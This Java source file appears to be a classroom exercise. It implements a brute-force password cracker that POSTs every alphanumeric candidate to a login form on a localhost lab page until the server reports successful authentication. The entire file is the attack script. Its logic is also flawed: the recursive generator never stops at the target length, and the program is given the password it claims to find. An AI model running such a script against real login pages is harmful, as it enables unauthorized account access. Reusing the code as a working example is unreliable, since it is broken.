
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class Exercice {
    public static void main(String[] args) {
        runBruteForceAttack();
    }

    public static void runBruteForceAttack() {
        String url = "http://localhost/tp2Copie/motDePasse.html";
        String expectedPassword = "passer";

        BruteForceCracker cracker = new BruteForceCracker(url, expectedPassword);
        cracker.crackPassword();
    }
}

class BruteForceCracker {
    private static final String CHARACTER_SET = "abcdefghijklmnopqrstuvwxyz0123456789";
    private String url;
    private String expectedPassword;
    private boolean passwordFound;

    public BruteForceCracker(String url, String expectedPassword) {
        this.url = url;
        this.expectedPassword = expectedPassword;
        this.passwordFound = false;
    }

    public void crackPassword() {
        long startTime = System.currentTimeMillis();

        while (!passwordFound) {
            for (int length = 1; length <= expectedPassword.length(); length++) {
                generatePasswords("", length);
            }
        }

        long endTime = System.currentTimeMillis();
        long elapsedTime = endTime - startTime;
        System.out.println("Mot de passe trouvé : " + expectedPassword);
        System.out.println("Temps écoulé : " + elapsedTime + " millisecondes");
    }

    private void generatePasswords(String currentPassword, int length) {
        if (passwordFound) {
            return;
        }

        if (currentPassword.length() == length) {
            if (sendRequest(currentPassword)) {
                passwordFound = true;
            }
        }

        for (int i = 0; i < CHARACTER_SET.length(); i++) {
            char c = CHARACTER_SET.charAt(i);
            generatePasswords(currentPassword + c, length);
        }
    }

    private boolean sendRequest(String password) {
        try {
            URL requestURL = new URL(url);

            // Paramètre du formulaire
            String postData = "passwordInput=" + URLEncoder.encode(password, "UTF-8");

            // Ouverture de la connexion HTTP
            HttpURLConnection conn = (HttpURLConnection) requestURL.openConnection();
            conn.setDoOutput(true);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

            // Envoi des données du formulaire
            OutputStream outputStream = conn.getOutputStream();
            outputStream.write(postData.getBytes("UTF-8"));
            outputStream.flush();
            outputStream.close();

            // Lecture de la réponse
            BufferedReader responseReader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String line;
            StringBuilder response = new StringBuilder();
            while ((line = responseReader.readLine()) != null) {
                response.append(line);
            }
            responseReader.close();

            // Vérification de la réponse du serveur
            return response.toString().contains("Authentification réussie");
        } catch (IOException e) {
            e.printStackTrace();
            return false;
        }
    }
}

